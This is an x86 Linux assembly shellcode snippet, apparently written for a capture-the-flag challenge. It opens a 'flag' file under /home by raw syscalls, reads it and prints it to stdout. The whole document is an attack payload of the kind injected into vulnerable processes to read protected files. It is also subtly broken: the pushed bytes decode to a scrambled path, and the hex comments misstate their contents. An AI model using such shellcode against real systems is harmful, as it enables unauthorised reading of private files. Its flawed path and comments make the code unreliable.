section .text
global _start

_start:
    ; Push filename onto the stack in reverse order
    xor eax, eax
    push eax
    push 0x67616c66  ; 'flag' in hexadecimal
    push 0x65797361  ; 'yase' in hexadecimal
    push 0x2f5f796e  ; '_yni' in hexadecimal
    push 0x69742f65  ; 't/em' in hexadecimal
    push 0x6d6f682f  ; 'oh//' in hexadecimal

    ; Open syscall
    mov al, 5
    lea ebx, [esp]
    xor ecx, ecx
    xor edx, edx
    int 0x80

    ; Read syscall
    mov ebx, eax
    xor eax, eax
    mov al, 3
    sub esp, 100
    mov ecx, esp
    mov dl, 100
    int 0x80

    ; Write syscall
    xor eax, eax
    mov al, 4
    xor ebx, ebx
    inc ebx
    int 0x80

    ; Exit syscall
    xor eax, eax
    mov al, 1
    xor ebx, ebx
    int 0x80